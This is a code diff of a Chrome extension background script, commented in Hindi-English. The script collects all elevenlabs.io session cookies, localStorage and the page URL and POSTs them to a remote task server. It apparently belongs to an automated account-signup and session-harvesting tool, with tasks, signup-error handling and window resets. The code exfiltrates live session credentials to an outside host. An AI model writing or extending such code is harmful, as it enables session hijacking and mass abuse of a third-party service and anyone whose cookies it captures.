@@ -233,12 +233,14 @@ chrome.runtime.onMessage.addListener(async (msg) => {
   }
 
   if (msg.type === 'SESSION_DATA') {
-    console.log('[BG] Session data mila!');
-    // Cookies — incognito cookies bhi lo
-    const cookies = await chrome.cookies.getAll({ domain: '.elevenlabs.io' });
+    if (!currentTask) return; // duplicate message guard
+    console.log('[BG] ✅ Session data mila! Task:', currentTask.id);
+
+    const cookies  = await chrome.cookies.getAll({ domain: '.elevenlabs.io' });
     const cookies2 = await chrome.cookies.getAll({ domain: 'elevenlabs.io' });
     const allCookies = [...cookies, ...cookies2];
 
+    const taskId = currentTask.id;
     const payload = {
       cookies: allCookies,
       localStorage: msg.localStorage,
@@ -246,18 +248,20 @@ chrome.runtime.onMessage.addListener(async (msg) => {
       url: msg.url,
     };
 
+    // Pehle windows close karo
+    await resetTask();
+
+    // Phir server ko bhejo
     try {
-      await fetch(`${SERVER_URL}/task/${currentTask.id}/complete`, {
+      await fetch(`${SERVER_URL}/task/${taskId}/complete`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload),
       });
-      console.log('[BG] ✅ Task complete!');
+      console.log('[BG] ✅ Server ko data bhej diya, next task ke liye ready!');
     } catch (e) {
       console.error('[BG] Complete error:', e.message);
     }
-
-    await resetTask();
   }
 
   if (msg.type === 'SIGNUP_ERROR') {
